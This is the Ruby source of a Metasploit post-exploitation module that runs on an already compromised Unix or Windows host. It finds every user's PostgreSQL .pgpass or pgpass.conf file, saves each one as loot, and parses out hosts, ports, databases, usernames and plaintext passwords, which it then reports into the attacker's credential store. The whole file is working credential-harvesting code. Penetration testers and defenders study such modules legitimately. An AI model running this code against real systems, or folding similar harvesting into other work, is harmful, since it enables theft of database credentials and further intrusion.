##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'msf/core/post/unix'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info(info,
      'Name'          => 'Multi Gather pgpass Credentials',
      'Description'   => %q{
          This module will collect the contents of all users' .pgpass or pgpass.conf
          file and parse them for credentials.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Zach Grace <zgrace[at]403labs.com>'],
      'Platform'      => %w[linux bsd unix osx win],
      'SessionTypes'  => %w[meterpreter shell]
    ))
  end

  def run
    print_status("Finding pgpass creds")

    files = []
    case session.platform
    when /unix|linux|bsd|osx/
      files = enum_user_directories.map {|d| d + "/.pgpass"}.select { |f| file?(f) }
    when /win/
      if session.type != "meterpreter"
        print_error("Only meterpreter sessions are supported on windows hosts")
        return
      end

      grab_user_profiles.select do |user|
        f = "#{user['AppData']}\\postgresql\\pgpass.conf"
        if user['AppData'] && file?(f)
          files << f
        end
      end
    else
      print_error("Unsupported platform #{session.platform}")
      return
    end

    if files.nil? || files.empty?
      print_error("No users found with a .pgpass or pgpass.conf file")
      return
    end

    files.each do |f|
      # Store the loot
      print_good("Downloading #{f}")
      pgpass_path = store_loot("postgres.pgpass", "text/plain", session, read_file(f), "#{f}", "pgpass #{f} file")
      print_good "Postgres credentials file saved to #{pgpass_path}"
      # Store the creds
      parse_creds(f)
    end
  end

  # Store the creds to
  def parse_creds(f)
    cred_table = Rex::Ui::Text::Table.new(
      'Header'  => 'Postgres Data',
      'Indent'  => 1,
      'Columns' => ['Host', 'Port', 'DB', 'User', 'Password']
    )

    read_file(f).each_line do |entry|
      ip, port, db, user, pass = entry.chomp.split(/:/, 5)

      # Fix for some weirdness that happens with backslashes
      p = ""
      bs = false
      pass.split(//).each do |c|
        if c == "\\"
          if bs == false
            bs = true
            p << c
          else
            # second backslash ignore
            bs = false
          end
        else
          if c == ":" && bs == true
            p = "#{p[0,p.length-1]}:"
          else
            p << c
          end
        end
      end

      pass = p
      cred_table << [ip, port, db, user, pass]

      cred_hash = {
        :host => session.session_host,
        :port => port,
        :user => user,
        :pass => pass,
        :ptype => "password",
        :sname => "postgres",
        :source_type => "Cred",
        :duplicate_ok => true,
        :active => true
      }

      report_auth_info(cred_hash)
    end

    if not cred_table.rows.empty?
      print_line
      print_line(cred_table.to_s)
    end
  end
end
